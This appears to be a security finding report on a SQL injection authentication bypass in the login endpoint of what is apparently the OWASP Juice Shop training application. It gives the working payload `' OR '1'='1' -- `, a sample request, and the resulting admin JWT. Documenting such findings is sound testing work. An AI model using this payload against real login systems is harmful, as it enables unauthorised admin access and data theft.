# Authentication Bypass via SQL Injection in Login

**Endpoint:** POST /rest/user/login
**Vulnerable Parameter:** email
**Vulnerability Class:** SQL Injection leading to Authentication Bypass

## Evidence
Using the SQLi payload `' OR '1'='1' -- ` in the email field bypasses authentication entirely:
- Status: 200 OK (normal login response)
- Returns a valid JWT Bearer token for the **admin** account
- JWT payload decoded: `{"data": {"id": 1, "username": "", "email": "admin@juice-sh.op", "role": "admin", ...}, "bid": 1}`
- The attacker gains full administrative access without knowing any password.

## Detection Payload
```
POST /rest/user/login
{"email": "recon@test.com' OR '1'='1' -- ", "password": "anything"}
```

## Impact
Complete authentication bypass. Attacker gains admin-level access to the application, including all privileged endpoints and data.

## Notes
This is a critical severity vulnerability. The SQL injection in the email field allows bypassing all authentication logic by making the WHERE clause always true.